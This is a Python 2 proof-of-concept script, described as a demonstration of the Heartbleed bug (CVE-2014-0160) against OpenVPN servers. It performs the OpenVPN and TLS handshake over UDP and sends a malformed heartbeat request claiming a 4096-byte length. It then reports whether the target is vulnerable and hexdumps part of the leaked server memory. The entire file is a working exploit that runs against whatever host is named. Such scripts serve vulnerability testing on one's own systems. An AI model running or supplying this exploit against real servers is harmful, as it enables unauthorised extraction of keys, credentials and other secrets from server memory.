#!/usr/bin/env python2

# Quick and dirty demonstration of CVE-2014-0160 on OpenVPN
# by Stefan Agner (stefan@agner.ch)
# based on work of Jared Stafford and Yonathan Klijnsma
# The author disclaims copyright to this source code.

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

target = None

# OpenVPN Session ID
lsesseionid = 0x12345678
packetid = 0

options = OptionParser(usage='%prog server [options]', description='Test for TLS heartbeat vulnerability on OpenVPN Server (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=1194, help='Port to test (default: 1194)')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

hello_openvpn = h2bin('''
16 03 01 00 df 01 00 00 db 03 01 95 a3 8a 7f 46
a9 1c 78 99 21 ae 92 6d 2d 14 5a 8f 2b c8 ee e2
0b 9e 38 34 ec 3d 66 2b 9c d5 63 00 00 68 c0 14
c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f
c0 05 00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16
00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e
00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04
00 2f 00 96 00 41 00 07 c0 11 c0 07 c0 0c c0 02
00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08
00 06 00 03 00 ff 02 01 00 00 49 00 0b 00 04 03
00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19 00
0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00
06 00 07 00 14 00 15 00 04 00 05 00 12 00 13 00
01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00
0f 00 01 01
''')

# Get OpenVPN header...
def msg_hdr(hdr):
    if hdr is None:
        return None, None, None

    typ, sessionid, packarrlen = struct.unpack('>bQb', hdr)
    #print "Typ %d, SessionID %d, Packet-ID array length %d" % (typ, sessionid, packarrlen)
    return typ, sessionid, packarrlen

def msg_tls_heartbeat_header(data):
    typ, ver, length = struct.unpack('>bhh', data[0:5])
    return typ, ver, length

def msg_tls_heartbeat_request(payload, hb_length=0x4000):
    return struct.pack('>bhhbh{0}s'.format(len(payload)), 24, 0x0301, len(payload) + 3, 1, hb_length, payload)
 
def check_hb(typ, ver, pay_length):
    if typ == 24:
        if pay_length > 3:
            print target + '|VULNERABLE'
        else:
            print target + '|NOT VULNERABLE'
        return True

    if typ == 21:
        print target + '|NOT VULNERABLE'
        return False

    print target + '|NOT VULNERABLE'
    return False


def msg_id(data):
    packid,  = struct.unpack('>i', data)
    return packid

def msg_pack(data):
    # Packet ID...
    return

def hexdump(src, length=8):
    result = []
    digits = 4 if isinstance(src, unicode) else 2
    for i in xrange(0, len(src), length):
       s = src[i:i+length]
       hexa = b' '.join(["%0*X" % (digits, ord(x))  for x in s])
       text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.'  for x in s])
       result.append( b"%04X   %-*s   %s" % (i, length*(digits + 1), hexa, text) )
    return b'\n'.join(result)

def send_message(s, data):
    global packetid
    start = 0
    length = 0
    cnt = 0
    bytes_remaining = len(data)
    while bytes_remaining > 0:
        if bytes_remaining > 100:
            length = 100
        else:
            length = bytes_remaining

        s.send(struct.pack('>bQbi{0}s'.format(length), 0x20, lsesseionid, 0, packetid, data[start:start+length]))
        sys.stdout.flush()

        packetid += 1
        cnt += 1
        bytes_remaining -= length
        start += length
    return cnt

def handle_message(s):
    global lsesseionid
    data = s.recv(1024)
    pos = 10

    typ, sessionid, packarrlen = msg_hdr(data[0:pos])

    if packarrlen > 0:
        pos = 10 + packarrlen * 4
        msg_pack(data[10:pos])
        # Remote-SessionID
        pos += 8

    if typ == 0x28:
        #print "Ack received"
        return typ, sessionid, packarrlen, None, None

    # Send ACK..
    packid = msg_id(data[pos:pos+4])
    s.send(struct.pack('>bQbiQ', 0x28, lsesseionid, 1, packid, sessionid))

    if typ == 0x20:
        #print "Control Message received"
        return typ, sessionid, packarrlen, packid, data[pos+4:]

    return typ, sessionid, packarrlen, packid, None

def main():
    global target
    global lsesseionid
    global packetid

    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return

    target = args[0]

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sys.stdout.flush()
    s.connect((target, opts.port))
    sys.stdout.flush()

    s.send(struct.pack('>bqbi', 0x38, lsesseionid, 0, packetid))
    packetid += 1

    typ, sessionid, packarrlen, packid, payload = handle_message(s)

    send_message(s, hello_openvpn)

    while True:
        typ, sessionid, packarrlen, packid, payload = handle_message(s)

        # Look for server hello done message.
        if typ == 0x20 and len(payload) < 100:
            break

        if typ == None:
            print "Hello message failed"
            return

    hb_length = 0x1000
    hb = msg_tls_heartbeat_request("Heartbleed test payload", hb_length)
    send_message(s, hb)

    hb_received = False
    heartbleed = ""
    other = 0

    # Heartbeat delivered, if vulnerable, we receive data...
    while True:
        typ, sessionid, packarrlen, packid, payload = handle_message(s)

        if typ == 0x20:
            # Control message, should contain heartbeat answer...
            heartbleed += payload
            if not hb_received:
                # Check HB header early...
                hb_received = True
                tlstype, tlsversion, tlslength = msg_tls_heartbeat_header(payload)
                check_hb(tlstype, tlsversion, tlslength)
        elif typ == 0x28:
            # We received ack only, the server ignored our heartbeat
            print target + '|NOT VULNERABLE (only ACK received)'
            return

        if len(heartbleed) >= hb_length + 5:
            break

    print hexdump(heartbleed[0:100], 16)

if __name__ == '__main__':
    main()
